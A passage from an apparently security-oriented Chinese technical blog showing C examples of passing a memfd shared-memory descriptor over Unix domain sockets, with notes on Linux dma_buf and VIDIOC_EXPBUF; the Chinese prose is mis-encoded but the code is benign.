<span class="keyword">int</span> n)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">cmsghdr</span> *<span class="title">cmsg</span>;</span></span><br><span class="line">        <span class="keyword">char</span> buf[CMSG_SPACE(n * <span class="keyword">sizeof</span>(<span class="keyword">int</span>))], dup[<span class="number">256</span>];</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">io</span> =</span> &#123; .iov_base = &amp;dup, .iov_len = <span class="keyword">sizeof</span>(dup) &#125;;</span><br><span class="line"></span><br><span class="line">        msg.msg_iov = &amp;io;</span><br><span class="line">        msg.msg_iovlen = <span class="number">1</span>;</span><br><span class="line">        msg.msg_control = buf;</span><br><span class="line">        msg.msg_controllen = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line">        cmsg = CMSG_FIRSTHDR(&amp;msg);</span><br><span class="line">        cmsg-&gt;cmsg_level = SOL_SOCKET;</span><br><span class="line">        cmsg-&gt;cmsg_type = SCM_RIGHTS;</span><br><span class="line">        cmsg-&gt;cmsg_len = CMSG_LEN(n * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span> ((<span class="keyword">int</span> *) CMSG_DATA(cmsg), fd, n * <span class="keyword">sizeof</span> (<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sendmsg (socket, &amp;msg, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">                handle_error (<span class="string">&quot;Failed to send message&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sfd, fd;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">addr</span>;</span></span><br><span class="line">        <span class="keyword">char</span> *buffer;</span><br><span class="line"></span><br><span class="line">        srand((<span class="keyword">unsigned</span> <span class="keyword">int</span>)time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">        sfd = socket(AF_UNIX, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (sfd == <span class="number">-1</span>)</span><br><span class="line">                handle_error (<span class="string">&quot;Failed to create socket&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(&amp;addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct sockaddr_un));</span><br><span class="line">        addr.sun_family = AF_UNIX;</span><br><span class="line">        <span class="built_in">strncpy</span>(addr.sun_path, <span class="string">&quot;/tmp/fd-pass.socket&quot;</span>, <span class="keyword">sizeof</span>(addr.sun_path) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        fd = syscall(__NR_memfd_create,<span class="string">&quot;shm&quot;</span>,MFD_CLOEXEC);</span><br><span class="line">        ftruncate(fd,<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">                handle_error (<span class="string">&quot;Failed to open file 1 for reading&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">fprintf</span> (<span class="built_in">stdout</span>, <span class="string">&quot;Opened fd %d in parent\n&quot;</span>, fd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (connect(sfd, (struct sockaddr *) &amp;addr, <span class="keyword">sizeof</span>(struct sockaddr_un)) == <span class="number">-1</span>)</span><br><span class="line">                handle_error (<span class="string">&quot;Failed to connect to socket&quot;</span>);</span><br><span class="line"></span><br><span class="line">        send_fd (sfd, &amp;fd, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        buffer = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>,<span class="number">0x30</span>,PROT_WRITE|PROT_READ,MAP_SHARED,fd,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(buffer == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                perror(<span class="string">&quot;[mmap error]&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">int</span> t=(<span class="keyword">int</span>)(rand()%<span class="number">1000</span>)/<span class="number">100</span>;</span><br><span class="line">                <span class="built_in">sprintf</span>(buffer,<span class="string">&quot;yhellow: %d&quot;</span>,t);</span><br><span class="line">                sleep(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Êé•Êî∂ÂÖ±‰∫´ÂÜÖÂ≠òÂè•ÊüÑÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> handle_error(msg) do &#123; perror(msg); exit(EXIT_FAILURE); &#125; while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> * <span class="title">recv_fd</span><span class="params">(<span class="keyword">int</span> socket, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> *fds = <span class="built_in">malloc</span> (n * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">cmsghdr</span> *<span class="title">cmsg</span>;</span></span><br><span class="line">        <span class="keyword">char</span> buf[CMSG_SPACE(n * <span class="keyword">sizeof</span>(<span class="keyword">int</span>))], dup[<span class="number">256</span>];</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">io</span> =</span> &#123; .iov_base = &amp;dup, .iov_len = <span class="keyword">sizeof</span>(dup) &#125;;</span><br><span class="line"></span><br><span class="line">        msg.msg_iov = &amp;io;</span><br><span class="line">        msg.msg_iovlen = <span class="number">1</span>;</span><br><span class="line">        msg.msg_control = buf;</span><br><span class="line">        msg.msg_controllen = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (recvmsg (socket, &amp;msg, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">                handle_error (<span class="string">&quot;Failed to receive message&quot;</span>);</span><br><span class="line"></span><br><span class="line">        cmsg = CMSG_FIRSTHDR(&amp;msg);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span> (fds, (<span class="keyword">int</span> *) CMSG_DATA(cmsg), n * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> fds;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">ssize_t</span> nbytes;</span><br><span class="line">        <span class="keyword">char</span> *buffer;</span><br><span class="line">        <span class="keyword">int</span> sfd, cfd, *fdp;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">addr</span>;</span></span><br><span class="line"></span><br><span class="line">        sfd = socket(AF_UNIX, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (sfd == <span class="number">-1</span>)</span><br><span class="line">                handle_error (<span class="string">&quot;Failed to create socket&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (unlink (<span class="string">&quot;/tmp/fd-pass.socket&quot;</span>) == <span class="number">-1</span> &amp;&amp; errno != ENOENT)</span><br><span class="line">                handle_error (<span class="string">&quot;Removing socket file failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(&amp;addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct sockaddr_un));</span><br><span class="line">        addr.sun_family = AF_UNIX;</span><br><span class="line">        <span class="built_in">strncpy</span>(addr.sun_path, <span class="string">&quot;/tmp/fd-pass.socket&quot;</span>, <span class="keyword">sizeof</span>(addr.sun_path) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bind(sfd, (struct sockaddr *) &amp;addr, <span class="keyword">sizeof</span>(struct sockaddr_un)) == <span class="number">-1</span>)</span><br><span class="line">                handle_error (<span class="string">&quot;Failed to bind to socket&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (listen(sfd, <span class="number">5</span>) == <span class="number">-1</span>)</span><br><span class="line">                handle_error (<span class="string">&quot;Failed to listen on socket&quot;</span>);</span><br><span class="line"></span><br><span class="line">        cfd = accept(sfd, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (cfd == <span class="number">-1</span>)</span><br><span class="line">                handle_error (<span class="string">&quot;Failed to accept incoming connection&quot;</span>);</span><br><span class="line"></span><br><span class="line">        fdp = recv_fd (cfd, <span class="number">1</span>);</span><br><span class="line">        buffer = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>,<span class="number">0x30</span>,PROT_WRITE|PROT_READ,MAP_SHARED,*fdp,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">fprintf</span> (<span class="built_in">stdout</span>, <span class="string">&quot;Reading from passed fd %d\n&quot;</span>, *fdp);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buffer);</span><br><span class="line">                sleep(<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (close(cfd) == <span class="number">-1</span>)</span><br><span class="line">                handle_error (<span class="string">&quot;Failed to close client socket&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>ÁªìÊûúÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">‚ûú  <span class="built_in">exp</span> ./send </span><br><span class="line">Opened fd <span class="number">4</span> in parent</span><br><span class="line">‚ûú  <span class="built_in">exp</span> ./read </span><br><span class="line">Reading from passed fd <span class="number">5</span></span><br><span class="line">yhellow: <span class="number">4</span></span><br><span class="line">Reading from passed fd <span class="number">5</span></span><br><span class="line">yhellow: <span class="number">0</span></span><br><span class="line">Reading from passed fd <span class="number">5</span></span><br><span class="line">yhellow: <span class="number">5</span></span><br><span class="line">Reading from passed fd <span class="number">5</span></span><br><span class="line">yhellow: <span class="number">4</span></span><br><span class="line">Reading from passed fd <span class="number">5</span></span><br><span class="line">yhellow: <span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>ÂèÇËÄÉÔºö<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_56145255/article/details/124792742">ÂÖ±‰∫´ÂÜÖÂ≠òÊäÄÊúØ‰πãmemfd_create</a> </p>
<p><strong>dma_buf ÂÖ±‰∫´ÂÜÖÂ≠ò</strong></p>
<p>dma_buf ÂèØ‰ª•ÂÆûÁé∞ <code>buffer</code> Âú®Â§ö‰∏™ËÆæÂ§áÁöÑÂÖ±‰∫´ÔºåÂ¶ÇÊûúËÆæÂ§áÈ©±Âä®ÊÉ≥Ë¶ÅÂÖ±‰∫´ DMA ÁºìÂÜ≤Âå∫ÔºåÂèØ‰ª•ËÆ©‰∏Ä‰∏™È©±Âä®Êù•ÂØºÂá∫Ôºå‰∏Ä‰∏™È©±Âä®Êù•‰ΩøÁî®Ôºö</p>
<ul>
<li>ÂèØ‰ª•Êää‰∏ÄÁâáÂ∫ïÂ±ÇÈ©±Âä® A ÁöÑ buffer ÂØºÂá∫Âà∞Áî®Êà∑Á©∫Èó¥Êàê‰∏∫‰∏Ä‰∏™ fd</li>
<li>‰πüÂèØ‰ª•Êää fd ÂØºÂÖ•Âà∞Â∫ïÂ±ÇÈ©±Âä® B</li>
<li>Â¶ÇÊûúËøõË°å <code>mmap</code> ÂæóÂà∞ËôöÊãüÂú∞ÂùÄÔºåCPU ‰πüÊòØÂèØ‰ª•Âú®Áî®Êà∑Á©∫Èó¥ËÆøÈóÆÂà∞Â∑≤ÁªèËé∑ÂæóÁî®Êà∑Á©∫Èó¥ËôöÊãüÂú∞ÂùÄÁöÑÂ∫ïÂ±Ç buffer ÁöÑ</li>
</ul>
<p>Á±ª‰ºº‰∫éÊ∂àË¥πËÄÖÁîü‰∫ßËÄÖÊ®°ÂûãÔºåLinux DMA-BUF Â∞±ÊòØÂü∫‰∫éËøôÁßçÊñπÂºèÊù•ÂÆûÁé∞ÁöÑ</p>
<p>dma_buf Âú®ÂÜÖÊ†∏‰∏≠ÁöÑÁªìÊûÑ‰ΩìÂ¶Ç‰∏ãÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dma_buf</span> &#123;</span></span><br><span class="line">	<span class="keyword">size_t</span> size;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">attachments</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">dma_buf_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">lock</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> vmapping_counter;</span><br><span class="line">	<span class="keyword">void</span> *vmap_ptr;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *exp_name;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list_node</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *priv;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">reservation_object</span> *<span class="title">resv</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* poll support */</span></span><br><span class="line">	<span class="keyword">wait_queue_head_t</span> poll;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dma_buf_poll_cb_t</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">dma_fence_cb</span> <span class="title">cb</span>;</span></span><br><span class="line">		<span class="keyword">wait_queue_head_t</span> *poll;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">__poll_t</span> active;</span><br><span class="line">	&#125; cb_excl, cb_shared;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>ÂΩìÁî®Êà∑ <code>call VIDIOC_EXPBUF</code> Ëøô‰∏™ <code>IOCTL</code> ÁöÑÊó∂ÂÄôÔºåÂèØ‰ª•Êää dma_buf ËΩ¨Âåñ‰∏∫ fdÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ioctl</span><span class="params">(<span class="keyword">int</span> fd, VIDIOC_EXPBUF, struct v4l2_exportbuffer *argp)</span></span>;</span><br></pre></td></tr></table></figure>
<p>ÊÉ≥Ë¶ÅÊää dma_buf ÁöÑÂØºÂÖ•‰æßËÆæÂ§áÈ©±Âä®ÔºåÂàô‰ºöÁî®Âà∞Â¶Ç‰∏ãËøô‰∫õAPIÔºö </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ÂØºÂá∫ÁºìÂÜ≤ */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dma_buf_export(priv, ops, size, flags)                  \</span></span><br><span class="line"><span class="meta">    dma_buf_export_named(priv, ops, size, flags, __FILE__)</span></span><br><span class="line"><span class="function">struct dma_buf *<span class="title">dma_buf_export_named</span><span class="params">(<span class="keyword">void</span> *priv, struct dma_buf_ops *ops,</span></span></span><br><span class="line"><span class="params"><span class="function">                                     <span class="keyword">size_t</span> size, <span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function">                                     <span class="keyword">const</span> <span class="keyword">char</span> *exp_name)</span></span>; </span><br><span class="line"><span class="comment">/* Ëé∑ÂèñÊñá‰ª∂ÊèèËø∞Á¨¶ */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dma_buf_fd</span><span class="params">(struct dma_buf *dmabuf, <span class="keyword">int</span> flags)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">/* ËøûÊé•ÁºìÂÜ≤ */</span></span><br><span class="line"><span class="function">struct dma_buf *<span class="title">dma_buf_get</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;</span><br><span class="line"><span class="function">struct dma_buf_attachment *<span class="title">dma_buf_attach</span><span class="params">(struct dma_buf *dmabuf,</span></span></span><br><span class="line"><span class="params"><span class="function">                                          struct device *dev)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">/* Áî≥ËØ∑ËÆøÈóÆ */</span></span><br><span class="line"><span class="function">struct sg_table * <span class="title">dma_buf_map_attachment</span><span class="params">(struct dma_buf_attachment *,</span></span></span><br><span class="line"><span class="params"><span class="function">                                         <span class="keyword">enum</span> dma_data_direction)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_buf_unmap_attachment</span><span class="params">(struct dma_buf_attachment *, struct sg_table *)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">/* Êñ≠ÂºÄËøûÊé• */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_buf_detach</span><span class="params">(struct dma_buf *dmabuf,</span></span></span><br><span class="line"><span class="params"><span class="function">                    struct dma_buf_attachment *dmabuf_attach)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_buf_put</span><span class="params">(struct dma_buf *dmabuf)</span></span>; </span><br></pre></td></tr></table></figure>
<p>ÂèØ‰ª•ÈÄöËøáÂ¶Ç‰∏ãÊñπÂºèËé∑ÂèñÊñá‰ª∂ÊèèËø∞Á¨¶Ôºö </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">buffer_export</span><span class="params">(<span class="keyword">int</span> v4lfd, <span class="keyword">enum</span> v4l2_buf_type bt, <span class="keyword">int</span> index, <span class="keyword">int</span> *dmafd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">v4l2_exportbuffer</span> <span class="title">expbuf</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;expbuf, <span class="number">0</span>, <span class="keyword">sizeof</span>(expbuf));</span><br><span class="line">    expbuf.type = bt;</span><br><span class="line">    expbuf.index = index;</span><br><span class="line">    <span class="comment">// int ioctl(int fd, int request, struct v4l2_exportbuffer *argp);</span></span><br><span class="line">    <span class="keyword">if</span> (ioctl(v4lfd, VIDIOC_EXPBUF, &amp;expbuf) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;VIDIOC_EXPBUF&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *dmafd = expbuf.fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/23/Linux%20UDS%E4%B8%8EFD%E8%BF%81%E7%A7%BB%E6%8A%80%E6%9C%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PwnËøõ‰Ω†ÁöÑÂøÉ">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/23/Linux%20UDS%E4%B8%8EFD%E8%BF%81%E7%A7%BB%E6%8A%80%E6%9C%AF/" class="post-title-link" itemprop="url">Linux UDS‰∏éFDËøÅÁßªÊäÄÊúØ</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-11-23 00:58:34 / Modified: 01:03:28" itemprop="dateCreated datePublished" datetime="2022-11-23T00:58:34+08:00">2022-11-23</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>6.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Unix Domain Sockets</strong></p>
<p>UDSÔºàUnix Domain SocketsÔºâÂú® Linux ‰∏äË°®Áé∞‰∏∫‰∏Ä‰∏™Êñá‰ª∂ÔºåÁõ∏ÊØîËæÉ‰∫éÊôÆÈÄö socket ÁõëÂê¨Âú®Á´ØÂè£‰∏äÔºå‰∏Ä‰∏™ËøõÁ®ã‰πüÂèØ‰ª•ÁõëÂê¨Âú®‰∏Ä‰∏™ UDS Êñá‰ª∂‰∏äÔºåÊØîÂ¶Ç <code>/tmp/xjjdog.sock</code></p>
<p>Áî±‰∫éÈÄöËøáËøô‰∏™Êñá‰ª∂ËøõË°åÊï∞ÊçÆ‰º†ËæìÔºåÂπ∂‰∏çÈúÄË¶ÅËµ∞ÁΩëÂç°Á≠âÁâ©ÁêÜËÆæÂ§áÔºåÊâÄ‰ª•ÈÄöËøá UDS ‰º†ËæìÊï∞ÊçÆÔºåÈÄüÂ∫¶ÊòØÈùûÂ∏∏Âø´ÁöÑ</p>
<p>UDS ‰∏ªË¶ÅÁî®‰∫éÂêå‰∏Ä‰∏ªÊú∫‰∏äÁöÑËøõÁ®ãÈó¥ÈÄö‰ø°</p>
<p><strong>Socket ÁΩëÁªúÈÄö‰ø°ÂéüÁêÜ</strong></p>
<p>‰πãÂâçÂ∑≤ÁªèÂàÜÊûêËøá‰∫Ü Socket ÁöÑÁΩëÁªúÈÄö‰ø°ÂéüÁêÜ‰∏éÂÜÖÊ†∏ÂØπÂçèËÆÆÊ†àÁöÑÂ§ÑÁêÜ</p>
<p>Â§ßËá¥ÁöÑÊµÅÁ®ãÂ¶Ç‰∏ãÔºö</p>
<ul>
<li>È©±Âä®ÈÄöÁü•ÁΩëÂç°Êúâ‰∏Ä‰∏™Êñ∞ÁöÑÊèèËø∞Á¨¶ÔºàÊúâ‰∏Ä‰∏™Âç≥Â∞ÜÁΩëÁªúÂåÖÂà∞ËææÁΩëÂç°Ôºâ</li>
<li>ÁΩëÂç°‰ªé <code>RX ring buffer</code> ‰∏≠ÂèñÂá∫ÊèèËø∞Á¨¶Ôºå‰ªéËÄåËé∑Áü•ÁºìÂÜ≤Âå∫ÁöÑÂú∞ÂùÄÂíåÂ§ßÂ∞è</li>
